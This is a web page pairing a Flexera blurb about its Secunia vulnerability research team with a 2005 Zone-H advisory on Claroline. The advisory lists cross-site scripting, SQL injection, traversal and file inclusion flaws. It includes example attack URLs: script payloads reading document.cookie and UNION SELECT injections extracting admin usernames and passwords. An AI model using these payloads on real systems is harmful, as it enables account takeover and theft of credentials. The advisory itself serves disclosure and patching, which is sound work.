How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Zone-H Research Center Security Advisory 200501
<http://fr.zone-h.org>

Date of release: 27/04/2005

Software: Claroline ([www.claroline.net](http://www.claroline.net))

Affected versions:

(probably previous versions too)

Risk: High

Discovered by:
Kevin Fernandez "Siegfried"
Mehdi Oudad "deepfear"
from the Zone-H Research Team

Background (from their web site)
----------
Claroline is an Open Source software based on PHP/MySQL. It's a collaborative \
learning environment allowing teachers or education institutions to create and \
administer courses through the web.

Description
-----------
Multiple Cross site scripting, 10 SQL injection, 7 directory traversal and 4 remote \
file inclusion vulnerabilities have been found in Claroline.

Details
-------

1)Multiple Cross site scripting vulnerabilities have been found in the following \
pages: claroline/exercice/exercise_result.php
claroline/exercice/exercice_submit.php
claroline/calendar/myagenda.php
claroline/calendar/agenda.php
claroline/tracking/user_access_details.php
claroline/tracking/toolaccess_details.php
claroline/learnPath/learningPathList.php
claroline/learnPath/learningPathAdmin.php
claroline/learnPath/learningPath.php
claroline/tracking/userLog.php
[..]

Examples:
claroline/tracking/toolaccess_details.php?tool=%3Cscript%3Ealert('xss');%3C/script%3E
claroline/tracking/user_access_details.php?cmd=doc&data=%3Cscript%3Ealert('xss');%3C/script%3E
 claroline/calendar/myagenda.php?coursePath=%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
 [..]

2)10 SQL injections have been found, they could be exploited by users to retrieve the \
passwords of the admin, arbitrary teachers or students. \
claroline/learnPath/learningPath.php (3) claroline/tracking/exercises_details.php
claroline/learnPath/learningPathAdmin.php
claroline/tracking/learnPath_details.php
claroline/user/userInfo.php (2)
claroline/learnPath/modules_pool.php
claroline/learnPath/module.php

Examples:
claroline/user/userInfo.php?uInfo=-1%20UNION%20SELECT%20username,password,0,0,0,0,0%20from%20user%20where%20user_id=1/*
 claroline/tracking/exercises_details.php?exo_id=-1/**/UNION/**/SELECT%200,password,username,0,0,0%20from%20user%20where%20user_id=1--
 [..]

3)Multiple directory traversal vulnerabilities in "claroline/document/document.php" \
and "claroline/learnPath/insertMyDoc.php" could allow project administrators \
(teachers) to upload files in arbitrary folders or copy/move/delete (then view) files \
of arbitrary folders by performing directory traversal attacks.

4)Four remote file inclusion vulnerabilities have been discovered.

Solution
--------
The Claroline users are urged to update to version 1.54 or 1.6 final:
<http://www.claroline.net/download.htm>
